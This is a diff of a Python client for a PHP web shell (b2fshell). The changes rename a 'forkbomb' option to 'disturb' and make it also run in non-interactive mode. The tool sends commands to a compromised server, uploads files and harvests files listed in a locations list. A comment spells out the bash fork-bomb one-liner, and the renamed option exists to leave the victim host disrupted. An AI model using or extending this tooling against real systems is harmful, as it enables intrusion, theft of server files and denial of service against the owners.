@@ -24,7 +24,7 @@ ______  _____ ______   _   _            _  _
 #Style: DIM, NORMAL, BRIGHT, RESET_ALL
 
 target=""
-fork=False
+disturb=False
 CWD="~"
 host=None
 
@@ -87,8 +87,8 @@ class MyPrompt(Cmd):
     def do_exit(self, inp):
         print("")
         global fork
-        if fork:
-            forkbomb()
+        if disturb:
+            disturbtion()
         
         timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")
         log("exited: "+timestamp)
@@ -115,7 +115,7 @@ def gather_infos(): #every file of file-locations.txt until an empty line occurs
             return f
     f.close()
 
-def gather_more(): #every file after the empty line
+def gather_more(): #every file after the empty line #TODO support for wildcard in path
     global target
     f=gather_infos() #more should always include the most important and most important should always be first
     log("getting more information:")
@@ -153,8 +153,8 @@ def upload(localname,remotename):
     resp=request("?feature=upload",{"path":remotename,"file":file,"cwd":CWD})
     log("\n".join(resp["stdout"]))
 
-def forkbomb(): #:(){ :|:& };:
-    log("leaving forkbomb")
+def disturbtion(): #:(){ :|:& };:
+    log("leaving disturbtion")
     pass
 
 def log(msg):
@@ -163,10 +163,10 @@ def log(msg):
 def warn(msg):
     print(Fore.YELLOW+msg+Style.RESET_ALL)
 
-def main(target, infos: ('extracts the most important information', 'flag', 'i'),more: ('extracts the all important information', 'flag', 'm'),fork: ('leaves forkbomb', 'flag', 'f'),auto: ('non interactive', 'flag', 'a')):
+def main(target, infos: ('extracts the most important information', 'flag', 'i'),more: ('extracts the all important information', 'flag', 'm'),disturb: ('leaves disturbtion', 'flag', 'd'),auto: ('non interactive', 'flag', 'a')):
     "Use with b2fshell.php or b2fshell-headless.php"
     globals()['target'] = target
-    globals()['fork'] = fork
+    globals()['disturb'] = disturb
     globals()['host'] = target.replace("http://","").replace("https://","").split('/')[0]
     if more:
         gather_more()
@@ -178,6 +178,8 @@ def main(target, infos: ('extracts the most important information', 'flag', 'i')
         myp.update_prompt()
         myp.cmdloop(intro=asciifelx)
     else:
+        if disturb:
+            disturbtion()
         warn("--auto specified: terminating")
 if __name__ == '__main__':
     import plac; plac.call(main)
